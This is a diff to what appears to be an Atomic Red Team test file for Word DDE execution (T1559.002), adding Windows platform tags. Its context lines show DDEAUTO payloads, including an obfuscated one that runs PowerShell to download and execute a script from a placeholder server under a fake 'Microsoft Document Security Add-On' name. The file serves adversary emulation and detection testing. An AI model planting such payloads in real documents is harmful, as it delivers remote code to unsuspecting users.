@@ -21,6 +21,8 @@ atomic_tests:
 
       {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
     name: manual
+  run_on:
+  - windows
 - name: Execute PowerShell script via Word DDE
   auto_generated_guid: 47c21fb6-085e-4b0d-b4d2-26d72c3830b3
   description: |
@@ -31,9 +33,11 @@ atomic_tests:
     command: |
       start "$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"
     name: command_prompt
+  run_on:
+  - windows
 - name: DDEAUTO
   auto_generated_guid: cf91174c-4e74-414e-bec0-8d60a104d181
-  description: |
+  description: |2
 
     TrustedSec - Unicorn - https://github.com/trustedsec/unicorn
 
@@ -64,3 +68,5 @@ atomic_tests:
 
       10. DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"
     name: manual
+  run_on:
+  - windows
